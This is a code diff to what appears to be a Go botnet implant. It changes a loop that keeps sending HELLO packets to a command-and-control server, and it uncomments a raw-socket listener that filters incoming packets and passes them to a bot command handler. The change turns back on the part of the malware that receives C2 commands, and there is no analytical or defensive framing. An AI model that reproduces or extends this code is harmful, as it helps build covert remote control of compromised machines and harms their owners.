@@ -429,12 +429,14 @@ var lastCmdRan string
 // Continuously send HELLO messages so that the C2 can respond with commands
 func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
 	for {
-		fd := NewSocket()
-		defer unix.Close(fd)
+		
 		if debugCheck != "" { fmt.Println("[+] iface:", iface) }
 		if debugCheck != "" { fmt.Println("[+] src:", src) }
 		if debugCheck != "" { fmt.Println("[+] dst:", dst) }
 		if debugCheck != "" { fmt.Println("[+] dstMac:", dstMAC) }
+
+		fd := NewSocket()
+		defer unix.Close(fd)
 		
 		
 		packet := CreatePacket(iface, src, dst, 47135, 80, dstMAC, CreateHello(iface.HardwareAddr, src))
@@ -651,17 +653,17 @@ func main() {
 			//if debugCheck != "" { fmt.Println("[+] DST IP OBJECT DETAIL %s %s %s %s:" ip[12], ip[13], ip[14], ip[15]) }
 			//go sendHello(iface, src, net.IPv4(ip[12], ip[13], ip[14], ip[15]), dstMAC)
 
-			// // Create BPF filter vm
-			// vm := CreateBPFVM(FilterRaw)
+			// Create BPF filter vm
+			vm := CreateBPFVM(FilterRaw)
 
-			// // Listen for responses
-			// if debugCheck != "" { fmt.Println("[+] Listening") }
-			// for {
-			// 	packet, target := BotReadPacket(readfd, vm)
-			// 	if packet != nil {
-			// 		go botProcessPacket(packet, target, src)
-			// 	}
-			// }
+			// Listen for responses
+			if debugCheck != "" { fmt.Println("[+] Listening") }
+			for {
+				packet, target := BotReadPacket(readfd, vm)
+				if packet != nil {
+					go botProcessPacket(packet, target, src)
+				}
+			}
 		}
 	}
 
